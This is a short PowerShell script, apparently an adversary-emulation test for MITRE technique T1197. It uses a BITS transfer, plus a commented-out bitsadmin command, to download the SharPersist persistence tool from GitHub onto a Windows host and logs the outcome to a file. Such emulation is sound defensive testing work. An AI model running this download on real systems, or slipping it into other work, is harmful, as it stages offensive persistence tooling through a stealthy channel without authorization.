# Donwload SharPersist using Bitsadmin
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "BITS Job : Donwload SharPersist using Bitsadmin (T1197)"
Write-Output "==============================================================================="
#
$exf_file = "$env:PUBLIC\exf\Bits_SharePersist.txt";
$DownLoadSource = "https://github.com/mandiant/SharPersist/releases/download/v1.0.1/SharPersist.exe"
$DestDir = "$env:PUBLIC\Toolz\"
$DestFile = "SharPersist.exe"
$FullDest = $DestDir + $DestFile
#bitsadmin  /transfer DonwloadJob /download /priority normal https://github.com/mandiant/SharPersist/releases/download/v1.0.1/SharPersist.exe $env:PUBLIC\Toolz\SharPersist.exe
try {
    Start-BitsTransfer -Source $DownLoadSource -Destination $FullDest -DisplayName "Donwload_Process" -Description "Downloading File From the Internet" -Priority Foreground
    Write-Output "Added SharePersist Download to Bits !" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
}
catch {
    Write-Output "Error during Download : $($_.Exception.Message)" | Out-File -FilePath "$exf_file" -Encoding ascii -Append    
}